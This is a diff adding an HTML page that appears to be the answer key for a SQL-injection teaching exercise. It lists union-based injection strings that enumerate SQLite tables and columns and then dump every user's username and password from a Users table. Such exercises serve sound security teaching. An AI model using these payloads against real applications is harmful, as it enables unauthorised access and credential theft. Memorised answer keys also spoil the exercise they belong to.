@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Answers</title>
+    <h1>Solutions</h1>
+</head>
+<body>
+    <br>
+    <pre>
+- enter as search query to find the table names. the "--" at the end comments out the remaining sql in the code.
+
+    ' or 1 = 1 union select 0, name from sqlite_master where type = 'table' --
+
+- This will let us find the table names. (Users and Items)
+- Once we know user data is stored in Users table, we can search for the column names with
+
+    ' or 1 = 1 union select 1, name from PRAGMA_TABLE_INFO('Users') --
+
+- This will find 'username' and 'password' as column names
+- Now we can finally query to display these values
+
+    ' or 1 = 1 union select id, password from Users --
+    ' or 1 = 1 union select id, username from Users --
+
+- And now we have everyone's login info!
+    </pre>
+</body>
+</html>
